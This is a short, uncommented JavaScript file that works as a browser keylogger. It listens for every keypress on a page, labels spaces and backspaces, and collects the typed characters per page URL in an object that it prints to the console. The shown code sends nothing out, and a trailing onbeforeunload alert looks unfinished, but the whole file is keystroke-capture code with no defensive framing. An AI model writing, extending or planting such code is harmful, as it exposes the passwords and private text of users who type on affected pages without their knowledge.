var data = {};
document.addEventListener('keypress', function (event) {
var ascii = event.keyCode;
var b = location.href;
var a ;
console.log(ascii);
if((ascii >= 65 && ascii <= 90) || (ascii >= 97 && ascii <= 122))
{
    a = String.fromCharCode(event.which);
    console.log(a);
}

else if(ascii == 32)
{
	console.log("Space");
	a = "[Sp]";
	
}

else if(ascii == 8)
{
	console.log("BackSpace");
	a = "[Bksp]";
	
}

else
{
	a = String.fromCharCode(event.which);
	console.log(a);
}
if(data[b] == null)
{
   data[b] = "" + a;
}
else
{
	data[b]=data[b] + a;

}
console.log(data);
if(window.onbeforeunload)
	alert('are you sure');

});
